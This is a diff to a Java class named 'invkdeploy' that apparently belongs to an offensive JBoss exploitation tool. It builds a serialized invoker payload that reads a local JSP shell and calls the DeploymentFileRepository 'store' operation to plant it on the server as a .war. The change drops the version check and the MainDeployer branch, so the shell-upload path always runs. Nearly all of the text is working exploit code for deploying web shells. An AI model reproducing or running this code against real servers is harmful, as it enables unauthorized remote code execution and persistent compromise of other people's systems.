@@ -76,17 +76,15 @@ public class invkdeploy{
                 return;
             }
 
-            // parse 5.x settings
-            if(version.equals("5.0") || version.equals("5.1")){
-                jsp_path = local_url;
-                jsp_shell = readJsp(jsp_path);
-                if(jsp_shell == null){
-                    return;
-                }
-
-                jsp = jsp_path.substring(jsp_path.lastIndexOf("/") + 1);
-                jsps = jsp.split("\\.")[0];
+            jsp_path = local_url;
+            jsp_shell = readJsp(jsp_path);
+            if(jsp_shell == null){
+                return;
             }
+
+            jsp = jsp_path.substring(jsp_path.lastIndexOf("/") + 1);
+            jsps = jsp.split("\\.")[0];
+            
         }
         catch(Exception e){
             System.out.println(e);
@@ -103,24 +101,14 @@ public class invkdeploy{
                                                       java.lang.String[].class);
         payload.setMethod(method);
 
-        if(version.equals("5.0") || version.equals("5.1")){
-            file_list = new Object[]{
-                    new javax.management.ObjectName("jboss.admin:service=DeploymentFileRepository"),
-                    "store",
-                    new Object[]{String.format("%s.war", jsps), jsps, ".jsp", jsp_shell, true},
-                    new String[]{"java.lang.String", "java.lang.String", "java.lang.String",
-                                 "java.lang.String", "boolean"}
-            };
-        }
-        else{
-            file_list = new Object[]{ 
-                        new javax.management.ObjectName("jboss.system:service=MainDeployer"),
-                        "deploy",
-                        new String[]{ local_url },
-                        new String[]{ "java.lang.String" }
-                      };
-        }
-
+        file_list = new Object[]{
+                new javax.management.ObjectName("jboss.admin:service=DeploymentFileRepository"),
+                "store",
+                new Object[]{String.format("%s.war", jsps), jsps, ".jsp", jsp_shell, true},
+                new String[]{"java.lang.String", "java.lang.String", "java.lang.String",
+                             "java.lang.String", "boolean"}
+        };
+        
         payload.setArguments(file_list);
 
         FileOutputStream fileOut = new FileOutputStream(save_location); 
